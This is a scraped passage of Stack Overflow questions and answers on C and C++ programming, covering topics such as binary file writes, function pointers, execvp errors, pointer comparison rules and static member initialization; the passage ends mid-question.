<p>See also this <a href=""http://python.net/crew/theller/ctypes/tutorial.html#arrays"" rel=""nofollow"">ctypes tutorial</a>, it has lots of useful info.</p>
"
"<p>I am currently writing a BMP screenshot function for an OpenGL framework and am running into an odd issue writing the data out. The data being brought in from <code>glReadPixels</code> along with the BMP headers are all correct, but it seems the <code>ofstream.write</code> operation is randomly inserting invalid values.</p>

<p>Excerpts from a correct BMP of the image (created by Paint) and that of the one made by my function follows, highlighting the incorrect bytes. The row that is correct will always be the first one.</p>

<hr>

<p><strong>Row 0x08C</strong></p>

<pre><code>3B 0D 4A 3A 0A 48 38 08 45 36
3B 0D 4A 3A 0D 0A 48 38 08 45
            ^^
</code></pre>

<hr>

<p><strong>Row 0x0DC</strong> (already off by one at this point)</p>

<pre><code>3E 2F 07 3D 2E 0A 3F 31 0E 44
07 3E 2F 07 3D 2E 0D 0A 3F 31
                  ^^
</code></pre>

<hr>

<p><strong>Row 0x0E68</strong> (very next row, and off by two)</p>

<pre><code>35 13 48 3A 10 44 36 0A 3F 31
0E 44 35 13 48 3A 10 44 36 0D
                           ^^
</code></pre>

<hr>

<p>So there seems to a pattern where the invalid value is always <code>0x0D</code> and it is inserted in front of a <code>0x0A</code>. I have no idea why this might be happening, as I have confirmed that the headers and data from <code>glReadPixels</code> are all correct. The code for the method follows.</p>

<pre><code>bool captureScreen( const char* name, unsigned originX, unsigned originY, unsigned width, unsigned height )
{

    //...

    GLubyte* imageData = new GLubyte[ width * height * 3 ];
    glReadPixels( originX, originY, width, height, GL_BGR, GL_UNSIGNED_BYTE, imageData );

    //...

    captureAsBMP( imageData, width, height, path.c_str( ) );

    //...
}

bool captureAsBMP( GLubyte* data, GLuint width, GLuint height, const char* path )
{
    std::ofstream stream( path, std::ios_base::out );

    if( !stream.is_open( ) )
        return false;

    unsigned char BMPHeader[ 14 ] = { /* cut for brevity */ };
    unsigned char DIBHeader[ 40 ] = { /* cut for brevity */ };
    unsigned char padding[ 4 ] = { 0x00, 0x00, 0x00, 0x00 };

    unsigned int paddingLength = 4 - (( width * 3 ) % 4);
    paddingLength = ( paddingLength == 4 ? 0 : paddingLength );

    long fileSize = ( width * height * 3 ) + ( paddingLength * height ) + 54;
    long dataSize = fileSize - 54;

    memcpy( &amp;BMPHeader[ 2 ], &amp;fileSize, sizeof( long ) );
    memcpy( &amp;DIBHeader[ 4 ], &amp;width, sizeof( unsigned int ) );
    memcpy( &amp;DIBHeader[ 8 ], &amp;height, sizeof( unsigned int ) );
    memcpy( &amp;DIBHeader[ 20 ], &amp;dataSize, sizeof( long ) );

    stream.write( reinterpret_cast&lt; char* &gt;( BMPHeader ), 14 );
    stream.write( reinterpret_cast&lt; char* &gt;( DIBHeader ), 40 );

    unsigned pos = 0;

    // Write out one row at a time
    for( int i = 0; i &lt; height; i++ )
    {
        stream.write( reinterpret_cast&lt; char* &gt;( &amp;data[ pos ] ), ( width * 3 ) );

        // Is there padding that needs to be added?
        if( paddingLength != 0 )
            stream.write( reinterpret_cast&lt; char* &gt;( padding ), paddingLength );

        // Update where we are in data
        pos += width * 3;
    }

    stream.close( );

    return true;
}
</code></pre>

<p>Also of note, the image in question is a 800x600 and so this error is occurring during the first stream write of the rows, prior to padding and <code>pos</code> incrementing. </p>

<p>Finally, how it should appear: <a href=""http://imgur.com/oziid"" rel=""nofollow"">http://imgur.com/oziid</a></p>

<p>And how it does: <a href=""http://imgur.com/SrXgA"" rel=""nofollow"">http://imgur.com/SrXgA</a> (re-saved in Paint as Imgur complained of it being corrupted of course)</p>
","9530","","<p>You need to open your files in binary mode by adding the <code>std::ios::binary</code> flag to avoid <a href=""http://en.wikipedia.org/wiki/Newline#Common_problems"">CRLF conversion</a>.  On Windows, newlines are represented as the two bytes 0x0D 0x0A (carriage return + linefeed, or CR LF)—the C and C++ runtimes automatically translate those into just plain linefeeds on input, and they automatically translate plain linefeeds <code>'\n'</code> into CRLF pairs on output, when files are opened in text mode, which is the default.</p>

<p>To suppress these newline conversions, you need to tell the runtime not to translate.  With C++'s <code>iostream</code>s, this is done with the <code>std::ios::binary</code> flag; with C's <code>FILE*</code> streams, this is done with the <code>""b""</code> mode flag, e.g. <code>""rb""</code> for reading or <code>""wb""</code> for writing.</p>
"
"<p>I've been seeing these two parallel phrases since I started C weeks ago,  need someone with the knowledge of the C compiler to tell me which leads to better code.<br/></p>

<p>Version1:<br/></p>

<pre><code>char s[]=""aString"",*sp=&amp;s,c;
while(c=*sp++){
operation(c);
}
</code></pre>

<p>Version2:<br/></p>

<pre><code>char s[]=""aString"",*sp=&amp;s;
for(;*sp;sp++){
 operation(*sp);
}
</code></pre>

<p><br/>
Alright, I understand that version2 involves some repeating differencing, so is version1 always better than version 2? if not , what are some typical exceptions?</p>
","9530","","<p>Any optimizing compiler worth its salt will optimize them to the same assembly code.  Unless you've measured this with a profiler and determined that it's a bottleneck, don't bother trying to prematurely optimize it.</p>

<p>There are certain situations where, if the value is accessed more than once, that the compiler won't be able to be sure that the underlying string isn't changing, in which case it will have to do the memory access more than once.  In those cases, there'd be a very slight advantage to caching the character in a variable, but even then the advantage will be very minimal.  Something like this:</p>

<pre><code>for( ; *sp; sp++) {
    operation1(*sp);
    some_function(sp);
    operation2(*sp);
}
</code></pre>

<p>In this case, the compiler might not know if <code>some_function</code> modifies the underlying string, so it will have to read <code>*sp</code> from memory twice to ensure correct behavior in all cases.</p>
"
"<p>I have class like below</p>

<pre><code>#include &lt;iostream&gt;

#define Gb MemorySizeUnit.Gb
#define Mb MemorySizeUnit.Mb
#define Kb MemorySizeUnit.Kb

using namespace std;

enum MemorySizeUnit {Gb, Mb, Kb};

class Test
{
  private:
  MemorySizeUnit memSizeUnit;
  int memorySize;

  public:
  void setMemory(const int memSize, MemorySizeUnit unit);
 }
</code></pre>

<p>and i want to be able to do something like</p>

<pre><code>Test test;
test.setMemory(20, Gb);// as opposed to test.setMemory(20, MemorySizeUnit.Gb)
</code></pre>

<p>Compiler does not like that in #define, i have a "".""</p>
","9530","","<p>Just remove the <code>#define</code> altogether, enum values are placed in the outer namespace automatically.  It's not like C# or Java where the enum values have to be accessed through the enum name namespace, absnet a <code>using</code>-like declaration.</p>
"
"<p>In one of the docs for atomic variables in C++0x, when describing memory order, it mentions:</p>

<blockquote>
  <p>Release-Acquire Ordering</p>
  
  <p>On strongly-ordered systems (x86, SPARC, IBM mainframe), release-acquire ordering is
  automatic. No additional CPU instructions are issued for this synchronization mode, only
  certain compiler optimizations are affected...</p>
</blockquote>

<p>First is it true, that x86 follows strict memory ordering? 
Seems very inefficient to always impose this. Means every write and read has a fence?</p>

<p>Also, if I have an aligned int, on an x86 system, do the atomic variables serve any purpose at all? </p>
","9530","","<p>Yes, it's true that x86 has strict memory ordering, see Volume 3A, Chapter 8.2 of the <a href=""http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html"">Intel manuals</a>.  Older x86 processors such as the 386 provided truly strict ordering (called <strong>strong ordering</strong>) semantics, while more modern x86 processors have slightly relaxed conditions in a few cases, but nothing you need to worry about.  For example, the Pentium and 486 allow read cache misses to go ahead of buffered writes when the writes are cache hits (and are therefore to different addresses from the reads).</p>

<p>Yes, it can be inefficient.  Sometimes high-performance software is written only for other architectures with looser memory ordering requirements because of this.</p>

<p>Yes, atomic variables still serve a purpose on x86.  They have special semantics with the compiler such that a typical <a href=""http://en.wikipedia.org/wiki/Read-modify-write"">read-modify-write</a> operation happens atomically.  If you have two threads incrementing an atomic variable (by which I mean a variable of type <code>std::atomic&lt;T&gt;</code> in C++11) simultaneously, you can be assured that the value will be 2 larger; without <code>std::atomic</code>, you might end up with the wrong value because one thread cached the current value in a register while performing the increment, even though the store to memory is atomic on x86.</p>
"
"<p>I am new to function pointers and I would like your help.
I am having a method:</p>

<pre><code>int test3(int i)
{
    return i;
}
</code></pre>

<p>Then in another method(not main) I do:</p>

<pre><code>int (*pTest3)(int) = test3;
</code></pre>

<p>From the examples that I have read this seems ok.
However, I get a compile time error:</p>

<blockquote>
  <p>testFile.cpp:277:25: error: argument of type ‘int
  ({anonymous}::CheckingConsumer::)(int)’ does not match ‘int (*)(int)’</p>
</blockquote>

<p>I do not understand what is wrong. Any help would be appreciated.</p>

<p>Thanks a lot.</p>
","9530","","<p>Your <code>test3</code> is a member function of a <code>struct</code> or a <code>class</code>.  Class member functions have a hidden <code>this</code> parameter passed into them and so cannot be used with plain function pointers.  You need to either declare the function as <code>static</code> or move it outside the <code>struct</code>/<code>class</code>, so that it no longer has a hidden <code>this</code> parameter, or use a class method pointer instead of a function pointer:</p>

<pre><code>// static class method:
class X
{
    static int test3(int i)
    {
        ...
    }
};

// Non-class method, at global scope
int test3(int i)
{
    ...
}

// Class method pointer
class X
{
    int test3(int i)
    {
        ...
    }
};

// Create the method pointer
int (X::*pTest3) = &amp;X::test3;
X *obj;
// Call the method pointer on an object
(obj -&gt;* pTest3)(42);
</code></pre>
"
"<p>I'm attempting to compile a sample c file that was given to me, but unfortunately, it's missing several libraries as some of the include files cannot find them. Namely: stropts.h, netdb.h, sys/socket.h, sys/ioctl.h, netinet/in.h, pthread.h, and unistd.h.</p>

<p>I've researched where I could fix these problems, but surprisingly there have been little to no results on this problem strangely. The Visual Studio command prompt isn't able to compile it until I can find these libraries. Anything I need to download/ link to fix this?</p>
","9530","","<p>Those header files are not part of standard C or C++.  Do not attempt to download the headers from other sources; even if you can get them to compile, they won't link properly since you don't have the implementations of the functions declared therein in a static library or DLL.</p>

<p>The simple fact of the matter is that the code you're trying to compile was written for Unix/Unix-like systems and it's not portable to Windows.  You'll need to either significantly rewrite the code to use the equivalent Windows functionality or a 3rd-party platform-independent library (e.g. Winsock or Boost sockets for sockets), compile it on a Unix system (you could use a virtual machine if you want), or use a Unix compatibility layer such as Cygwin.</p>
"
"<p>I understand that inline functions are functions whose bodies are inserted into the place at which they are called. Then why therefore aren't inline functions affected by scope changes when they are invoked:</p>

<pre><code>#include &lt;iostream&gt;

inline void alert(const std::string &amp;str) { cout &lt;&lt; str; }

int main() {
    using namespace std;

    alert(""Hello World""); // cout &lt;&lt; ""Hello World"";
}
</code></pre>

<p>This doesn't work because I get the error <code>cout was not declared in this scope</code>, but if I do <code>std::cout</code> it does. Why doesn't C++ know that <code>cout</code> is a member of <code>std</code> if the function body of inline functions are inserted into the scope?</p>
","9530","","<p>Because C++ uses static scoping, not dynamic scoping.  The compiler looks up the name in the scope of where the function is defined, not the scope of where the function is called.</p>
"
"<p>I've just started with SDL after doing some research. I started with this tutorial <a href=""http://lazyfoo.net/SDL_tutorials/lesson01/index2.php"" rel=""nofollow"">http://lazyfoo.net/SDL_tutorials/lesson01/index2.php</a> &lt;&lt; Using the exact same code and bmp image.</p>

<p>For some reason when I debug and run the program inside my IDE (Microsoft visual studio) the screen loads but the picture that should be popping up on the screen does not. However, when I would go to my project and run the program manually it does everything smoothly. After doing some research it turned out SDL_LoadBMP() returns NULL (it returns NULL if an error occured). But why? Also, how can I see what the error actually is?</p>
","9530","","<p>Is the bitmap you're trying to load in the correct directory?  When you launch your program from Visual Studio, it starts with the current working directory in the directory where your project (<code>.vcproj</code> or <code>.vcxproj</code> file) is contained.  Make sure your paths are all relative to that directory.</p>

<p>However, if you're launching by double-clicking the executable in Windows Explorer (which is typically in a <code>Debug\</code> or <code>Release\</code> subdirectory by default), then it starts with a current working directory of that folder.</p>
"
"<p>Say I have a specific instant in time where I know the hour, minute, day, second, month, year, etc; how can I convert this epoch time (seconds since 1970)?</p>

<p>I can't use Boost, so please don't suggest a Boost solution.</p>
","9530","","<p>Use the <a href=""http://linux.die.net/man/3/mktime""><code>mktime(3)</code></a> function.  For example:</p>

<pre><code>struct tm t = {0};  // Initalize to all 0's
t.tm_year = 112;  // This is year-1900, so 112 = 2012
t.tm_mon = 8;
t.tm_mday = 15;
t.tm_hour = 21;
t.tm_min = 54;
t.tm_sec = 13;
time_t timeSinceEpoch = mktime(&amp;t);
// Result: 1347764053
</code></pre>
"
"<p>Is there a way I can mute all my printf statements conditionally, however, without using any macros? I want to accomplish the muting without touching the already existing code, but adding a line to my module which would simply disable all printf's already existing in the source code.</p>

<p>Thanks!</p>
","9530","","<p>If you want to nullify all output to <code>stdout</code> via <code>printf</code>, <code>puts</code>, <code>putchar</code>, etc., you can use <a href=""http://linux.die.net/man/3/freopen"" rel=""nofollow""><code>freopen(3)</code></a> to redirect it to a bit bucket, e.g.:</p>

<pre><code>// On Unix and Unix-like systems:
freopen(""/dev/null"", ""w"", stdout);
// On Windows:
freopen(""NUL"", ""w"", stdout);
</code></pre>
"
"<p>I tried to create POSIX thread with a void function like this:</p>

<pre><code>void thread_func(void* p_Arg)
{
    printf(""Hello, World!\n"");
}

int main(void)
{
    pthread_t thread;
    pthread_create(&amp;thread, NULL, (void*)thread_func, (void*)NULL);

    return 0;
}
</code></pre>

<p>The code works fine! But is it safe to cast thread_func to void* in this case?</p>
","9530","","<p>No.  Your code <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2004/01/19/60162.aspx"" rel=""nofollow"">will crash on IA64</a>.  A function pointer cast is <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2011/05/06/10161590.aspx"" rel=""nofollow"">a bug waiting to happen</a>.  Just use the correct signature and return a dummy value like 0.</p>

<p>Also note that casting a function pointer (like <code>void (*)(void*)</code>) to an object pointer (like <code>void*</code>) is also a potentially unsafe operation, since the C standard does not guarantee that object pointers and function pointers have the same representation.  I don't know of any architectures off-hand that use different representations, but it's certainly possible for a function pointer to contain extra context bits not normally present in object pointers.</p>

<p>So you should never cast a function pointer to an object pointer unless you're using an implementation the expressly allows it -- for example, <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/V2_chap02.html#tag_15_12_03"" rel=""nofollow"">POSIX systems require</a> this, so the return value from <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/dlsym.html"" rel=""nofollow""><code>dlsym(3)</code></a> can be safely cast from an object pointer to a function pointer.</p>
"
"<p>I am developing an application that will access smart cards using the standard PKCS#11. At this moment the application is working very well both on Ubuntu and OS X. Now I am porting it to Windows, but I am getting an ""access violation"" exception whenever I call functions from the pkcs#11 library, which is linked at runtime.</p>

<p>Below I tried to reproduce a SSCCE of my code (The place where the exception is happening is identified with a comment).</p>

<pre><code>void * libraryHandle = NULL;
CK_RV   rv;
CK_C_GetFunctionList pC_GetFunctionList;
CK_FUNCTION_LIST_PTR functions;


libraryHandle = LoadLibrary(L""C:\\WINDOWS\\system32\\pteidpkcs11.dll"");
if (libraryHandle == NULL)
{
    printf(""Library not loaded\n"");
    exit(1);
}

pC_GetFunctionList = (CK_C_GetFunctionList) GetProcAddress((HMODULE)libraryHandle, ""C_GetFunctionList"");

if (pC_GetFunctionList == NULL)
{
    printf(""Function not loaded\n"");
    FreeLibrary((HMODULE)libraryHandle);
    exit(1);
}

rv = (*pC_GetFunctionList) (&amp;functions);
assert(rv == CKR_OK);
printf(""Point A\n"");

if(functions == NULL)
{ 
    printf(""Functions not loaded\n"");
    FreeLibrary((HMODULE)libraryHandle);
    exit(1);        
}

printf(""%u - %u\n"",functions-&gt;version.major, functions-&gt;version.minor); // Prints without problems
rv = (*functions-&gt;C_Initialize) (NULL_PTR); //THIS IS THE PLACE WHERE I AM GETTING THE ACCESS VIOLATION
assert(rv == CKR_OK);

//printf(""Point B\n"");

FreeLibrary((HMODULE)libraryHandle);
</code></pre>

<p>When I debug the application the structure ""CK_FUNCTION_LIST_PTR functions"" seems to be valid.</p>

<p>Does anyone know what is causing this exception?</p>

<p>I am using Visual Studio 2010 Ultimate and Windows XP SP3.</p>

<p>Thanks!</p>

<p>(PS: I have already tried to load the function ""C_Initialize"" using ""GetProcAddress"" from the library, and it worked)</p>

<p>--- Edit</p>

<p>CK_FUNCTION_LIST definition</p>

<pre><code>struct CK_FUNCTION_LIST {

  CK_VERSION    version;  /* Cryptoki version */

/* Pile all the function pointers into the CK_FUNCTION_LIST. */
/* pkcs11f.h has all the information about the Cryptoki
 * function prototypes. */
#include ""pkcs11f.h""

};
</code></pre>

<p>Full headers in: 
  <a href=""http://www.rsa.com/rsalabs/node.asp?id=2133"" rel=""nofollow"">http://www.rsa.com/rsalabs/node.asp?id=2133</a></p>
","9530","","<p>From that image, it looks like you either have some sort of disagreement on the layout of your <code>CK_FUNCTION_LIST_PTR</code> structure between the executable and the DLL.  Make sure the executable and DLL are both compiled with the same compiler settings etc.</p>

<p>What is the definition (including any surrounding pragmas/macros) of <code>CK_FUNCTION_LIST_PTR</code>?  Is <code>sizeof(CK_FUNCTION_LIST_PTR)</code> the same if you print out its value from both your executable and from inside the DLL (in, say, <code>C_GetFunctionList()</code>)?</p>
"
"<p>Using C++ Native solution in Visual Studio 2010. </p>

<p><code>#pragma warning (push)</code> is used in the beginning of the cpp file, after all the includes. After that there are couple of disabled warning by <code>#pragma warning(disable : XXXX)</code>.</p>

<p>What are possible consequences of omitting <code>#pragma warning(pop)</code> at the end of the file?</p>

<p>Thanks</p>
","9530","","<p>If you have any other source files that <code>#include</code> that cpp file, then the warning state when compiling the outer file will be messed up -- it could fail to give warnings when the warnings were warranted.</p>

<p>Note, however, that <code>#include</code>ing a cpp file is considered bad form and a code smell; there are certain, rare, situations where it might be the right thing to do (such as a build system that <code>#include</code>s many source files into one to reduce compilation times, sort of like precompiled headers), but almost always it's the wrong thing to do, even if it manages to compile and link without errors.</p>

<p>If that source file is never <code>#include</code>d anywhere else, then failing to have a <code>#pragma warning(pop)</code> will not have any adverse consequences, assuming the compiler doesn't complain about that mismatch in the first place.</p>
"
"<p>I want to write code that zips a folder to a .zip file, or unzips a .zip file into a folder. I believe I need some library that supports it, am I right? If so, is there a specific library I should use? I want to write the code in C++ on a Linux machine (Ubuntu).
Thanks for the help.</p>
","9530","","<p>Try <a href=""http://www.nih.at/libzip/"" rel=""nofollow"">libzip</a>.  I haven't used it, but it looks like it presents an API very similar to the stdio API for accessing compressed files within ZIP archives.</p>
"
"<p>I am coding a screensaver program running on Windows.  </p>

<p>In preview mode, Windows calls the program this way :<br>
<code>Screensaver.exe /p ParentWindowHandle</code>  </p>

<p>However, when I make this call in my program :<br>
<code>BOOL res = GetClientRect(parentWindowHandle, rect)</code><br>
res is FALSE, rect is NULL and I get <code>ERROR_INVALID_WINDOW_HANDLE</code> with <code>GetLastError()</code></p>

<p><code>GetWindowRect</code> gives me the same results.</p>

<p>But, if I make a call to <code>BOOL res = IsWindow(parentWindowHandle)</code> instead, I get res == TRUE. Does this not mean I have a valid window handle ?</p>

<p>The code looks like this :  </p>

<pre><code>int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    unsigned int handle = GetHandleFromCommandLine(pCmdLine); // Custom function (tested and approved :) )
    HWND parentWindowHandle = (HWND) handle;
    LPRECT rect = NULL;
    BOOL res = GetClientRect(parentWindowHandle, rect);
    // here, rect == NULL, res == FALSE and GetLastError() returns ERROR_INVALID_WINDOW_HANDLE

    // ...
    // ...
}
</code></pre>
","9530","","<p>On 64-bit Windows, a window handle is 64 bits and cannot fit in an <code>unsigned int</code>, so your cast is producing a value that is an invalid window handle.  You should modify your <code>GetHandleFromCommandLine</code> function so that it returns a proper <code>HWND</code>, not an <code>unsigned int</code>, and no type cast is necessary.</p>

<p>Also, <code>GetClientRect</code> returns the rectangle by storing it into the value pointed at by the second parameter.  If you pass it <code>NULL</code>, it has nowhere to store that, so it will either crash or fail with an invalid parameter error.  To avoid that, pass in the address of a local variable:</p>

<pre><code>RECT rect;
GetClientRect(..., &amp;rect);
</code></pre>
"
"<p>Consider this hypothetical implementation of <code>vector</code>:</p>

<pre><code>template&lt;class T&gt;  // ignore the allocator
struct vector
{
    typedef T* iterator;
    typedef const T* const_iterator;

    template&lt;class It&gt;
    void insert(iterator where, It begin, It end)
    {
        ...
    }

    ...
}
</code></pre>

<h3>Problem</h3>

<p>There is a subtle problem we face here:<br>
There is the possibility that <code>begin</code> and <code>end</code> refer to items in the same vector, <em>after</em> <code>where</code>.</p>

<p>For example, if the user says:</p>

<pre><code>vector&lt;int&gt; items;
for (int i = 0; i &lt; 1000; i++)
    items.push_back(i);
items.insert(items.begin(), items.end() - 2, items.end() - 1);
</code></pre>

<p>If <code>It</code> is not a pointer type, then we're fine.<br>
But we don't know, so we must check that <code>[begin, end)</code> does not refer to a range already inside the vector.</p>

<p>But how do we do this? According to C++, if they <em>don't</em> refer to the same array, then pointer comparisons would be undefined!<br>
So the compiler could falsely tell us that the items don't alias, when in fact they do, giving us unnecessary O(n) slowdown.</p>

<h3>Potential solution &amp; caveat</h3>

<p>One solution is to copy the <em>entire</em> vector <em>every</em> time, to include the new items, and then throw away the old copy.</p>

<p>But that's very slow in scenarios such as in the example above, where we'd be copying 1000 items just to insert 1 item, even though we might clearly already have enough capacity.</p>

<h3>Is there a generic way to (correctly) solve this problem efficiently, i.e. <em>without</em> suffering from O(n) slowdown in cases where nothing is aliasing?</h3>
","9530","","<blockquote>
  <p>But how do we do this? According to C++, if they <em>don't</em> refer to the same array, then pointer comparisons would be undefined!</p>
</blockquote>

<p>Wrong.  The pointer comparisons are <em>unspecified</em>, not undefined.  From C++03 §5.9/2 [expr.rel]:</p>

<blockquote>
  <p>[...] Pointers to objects or functions of the same type (after pointer conversions) can be compared, with a result defined as follows:</p>
  
  <p>[...]<br>
  -Other pointer comparisons are unspecified.</p>
</blockquote>

<p>So it's safe to test if there is an overlap before doing the expensive-but-correct copy.</p>

<p>Interestingly, C99 differs from C++ in this, in that pointer comparisons between unrelated objects is undefined behavior.  From C99 §6.5.8/5:</p>

<blockquote>
  <p>When two pointers are compared, the result depends on the relative locations in the address space of the objects pointed to. [...] In all other cases, the behavior is undefined.</p>
</blockquote>
"
"<p>I am unable to compile this simple program</p>

<pre><code>#include&lt;stdio.h&gt;
#include&lt;conio.h&gt;
#include&lt;spawn.h&gt;
#include&lt;process.h&gt;

int main(){
    printf(""Spawning new process...\n"");
    spawnl(P_WAIT,""curl"",""www.google.co.in"",NULL);
    system(""cls"");
    printf(""Program execution completed somehow!\n"");
    getch();
    return 0;
}
</code></pre>

<p>I have tried using following command:</p>

<pre><code>g++ filename.cpp -l -o filename.cpp
</code></pre>

<p>Result: <code>ld.exe cannot find -l exit with status 1</code></p>

<pre><code>g++ filename.cpp -o filename
</code></pre>

<p>Result: <code>error: spawn.h No such file or directory.</code></p>

<p>Is there a problem with my MinGW installation? I am using Windows 7 32 bit and MinGW.</p>
","9530","","<p><code>spawn.h</code> is not a standard C/C++ header.  POSIX defines a non-standard <code>&lt;spawn.h&gt;</code> header, but it doesn't define a <code>spawnl</code> function, and Windows is not a POSIX-conforming system anyways.</p>

<p>Windows does define the <a href=""http://msdn.microsoft.com/en-us/library/wweek9sc%28v=vs.80%29.aspx"" rel=""nofollow""><code>_spawnl</code></a> function in <code>&lt;process.h&gt;</code>, so the easiest thing to do would be to just remove the inclusion of <code>&lt;spawn.h&gt;</code> and use that instead.  You could also rewrite your code to use the Windows function <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms682425%28v=vs.85%29.aspx"" rel=""nofollow""><code>CreateProcess</code></a>.</p>
"
"<p>This is more of a philosophical question, but I've seen this a bunch of times in codebases here and there and do not really understand how this programming method came to be.</p>

<p>Suppose you have to set bits 2 and 3 to some value x without changing the other values in the uint.  Doing so is pretty trivial and a common task, and I would be inclined to do it this way:</p>

<pre><code>uint8_t someval = 0xFF; //some random previous value
uint8_t x = 0x2; //some random value to assign.
someval = (somval &amp; ~0xC) | (x &lt;&lt; 2); //Set the value to 0x2 for bits 2-3
</code></pre>

<p>I've seen code that instead or using '|' uses '+':</p>

<pre><code>uint8_t someval = 0xFF; //some random previous value
uint8_t x = 0x2; //some random value to assign.
someval = (somval &amp; ~0xC) + (x &lt;&lt; 2); //Set the value to 0x2 for bits 2-3
</code></pre>

<p>Are they equivalent?<br>
Yes.  </p>

<p>Is one better than the other?<br>
Only if your hardware doesn't have a bitwise OR instruction, but I have never ever ever seen a processor that didn't have a bitwise OR (even small PIC10 processors have an OR instruction).</p>

<p>So why would some programmers be inclined to use '+' instead of '|'?  Am I missing some really obvious, uber powerful optimization here?</p>
","9530","","<p>It's just a question of style.  Any modern CPU will complete both operations in the same number of cycles (typically 1).  Personally I prefer <code>|</code> in these cases since it more explicitly states to the code reader that you're doing bit twiddling instead of arithmetic.</p>

<p>If you have a bug in your code, then using <code>+</code> could lead to strange behavior, whereas using <code>|</code> would tend to mask the bug.  For example, if you accidentally include the same bit twice, ORing it again is a no-op, but adding it will clear the bit and carry up into the next bit (and possibly farther, if more bits are set).  So that would usually lead to fail-fast behavior instead of failure-masking behavior, which is generally preferable.</p>
"
"<p>I'm trying to add a static constant variable to my class, which is an instance of a structure. Since it's static, I <strong>must</strong> initialize it in class declaration. Trying this code</p>

<pre><code>class Game {
    public:
        static const struct timespec UPDATE_TIMEOUT = { 10 , 10 };

    ...
};
</code></pre>

<p>Getting this error:</p>

<blockquote>
  <p>error: a brace-enclosed initializer is not allowed here before '{'
  token </p>
  
  <p>error: invalid in-class initialization of static data member of non-integral type 'const timespec'</p>
</blockquote>

<p>How do I initialize it? Thanks!</p>
","9530","","<p>Initialize it in a separate definition outside the class, inside a source file:</p>

<pre><code>// Header file
class Game {
    public:
        // Declaration:
        static const struct timespec UPDATE_TIMEOUT;
    ...
};

// Source file
const struct timespec Game::UPDATE_TIMEOUT = { 10 , 10 };  // Definition
</code></pre>

<p>If you include the definition in a header file, you'll likely get linker errors about multiply defined symbols if that header is included in more than one source file.</p>
"
"<p>I need to implement a basic shell in C.
One of things I need is to implement a function that has a command and to execute it.
my code:</p>

<pre><code>    pID=fork();

    if (pID == 0)
       execvp(tmp[0], tmp);
    else if (pID &gt; 0)
    {
       printf(""%d"", pID);
       wait(NULL);
    }
    else
      printf(""Failed to create proccess \n"");
</code></pre>

<p>The problem is that no matter what is the command I put in tmp, the program shows me the prompt again, and do nothing except that.
For example if I write <code>gedit</code> (in order to open the <code>gedit</code> — a ntpad of Ubuntu), it doesn't open it, or if write <code>ls -a</code> it doesn't show me any output as the terminal of Ubuntu does.</p>
","9530","","<p>Although you've failed to tell us what you're passing through the <code>tmp</code> variable to <code>execvp</code>, my psychic sense tells me that you forgot to null-terminate your argument list.  A NULL argument tells <code>execvp</code> where the last argument is, and if you fail to put in a NULL, it will start reading random garbage off the stack.</p>

<p>If that random garbage points to large strings of non-zero data, it will run out of space to store the supposed arguments to the new process, which is typically a few hundred KB (see <a href=""http://www.in-ulm.de/~mascheck/various/argmax/"" rel=""nofollow"">this page</a> for some system-specific numbers, as well as various ways of getting your system's maximum arguments size).</p>

<p>When there's too much argument data, the system call <a href=""http://linux.die.net/man/2/execve"" rel=""nofollow""><code>execve(2)</code></a> (called internally by <code>execvp</code>) fails with the error <code>E2BIG</code>.</p>

<p>So to see if this is what's happening to you, check the return value from <code>execvp</code>.  If it even returns at all, it failed (if it succeeded, it wouldn't have returned since a new process would be executing!), so check the global value of <code>errno</code> to see why it failed:</p>

<pre><code>if (pID == 0)
{
    execvp(tmp[0], tmp);
    printf(""exec failed: %s\n"", strerror(errno));
    exit(1);
}
</code></pre>
"
"<p>This following snippet of code from the Chromium source caught my eye (see line 155 <a href=""http://code.google.com/searchframe#OAMlx_jo-ck/src/chrome/browser/ui/webui/print_preview/print_preview_ui.cc"" rel=""nofollow"">here</a>):</p>

<pre><code>std::string PrintPreviewUI::GetPrintPreviewUIAddress() const {
  // Store the PrintPreviewUIAddress as a string.
  // ""0x"" + deadc0de + '\0' = 2 + 2 * sizeof(this) + 1;
  char preview_ui_addr[2 + (2 * sizeof(this)) + 1];
  base::snprintf(preview_ui_addr, sizeof(preview_ui_addr), ""%p"", this);
  return preview_ui_addr;
}
</code></pre>

<p>Doesn't <code>2 + (2 * sizeof(this)) + 1</code> evaluate to <code>3 + 2 * sizeof(this)</code>? Why did the authors choose to write the expression this way?</p>
","9530","","<p>Yes, it's the same, assuming that all of the types are integral and not floating-point, like they are in this case (for floating-point, the result will <em>usually</em> be the same, but there are some weird edge cases involving when things are rounded that can surprise you).</p>

<p>The authors probably chose to write it that way for clarity: they're storing a specific string in the buffer which is constructed by taking two bytes, adding some more data, and then adding one more byte.  Writing it this way allows the code reader to easily double-check that the calculated size indeed matches up with the amount of data being written by matching up the pieces one at a time.</p>
"
"<pre><code>char *buf = malloc(bufsize)
char *ptr = buf;
…
while(condition) {
    ptrdiff_t offset = ptr - buf;    // &lt;========== THIS LINE

    // offset will never be negative because we only ever *increase* ptr
    if ((size_t)offset &gt; bufsize) {
        // we need more room
        bufsize += 128;
        buf = realloc(buf, bufsize);
        ptr = buf + offset;  // buf might be in a completely new location
    }
    *ptr++ = …  // write this byte
}
</code></pre>

<p>Is this <strong>valid</strong> or <strong>undefined</strong>?</p>

<p>I would have assumed that it's valid, but I read something about it being undefined, so I googled it. These links seem to inescapably claim it's undefined:</p>

<ul>
<li><a href=""https://www.securecoding.cert.org/confluence/display/seccode/ARR36-"">Secure coding</a></li>
<li><a href=""http://stackoverflow.com/questions/9673084/is-subtraction-of-pointers-not-pointing-to-different-elements-of-same-array-vali"">Is subtraction of pointers not pointing to different elements of same array valid in C?</a></li>
</ul>

<p>However, no mention of it is made in these SO questions:</p>

<ul>
<li><a href=""http://stackoverflow.com/questions/3238482/pointer-subtraction-confusion"">Pointer subtraction confusion</a></li>
<li><a href=""http://stackoverflow.com/questions/11697547/size-t-return-pointer-subtraction"">size_t return pointer subtraction</a></li>
<li><a href=""http://stackoverflow.com/questions/759663/pointer-arithmetic-in-c"">Pointer Arithmetic In C</a></li>
</ul>

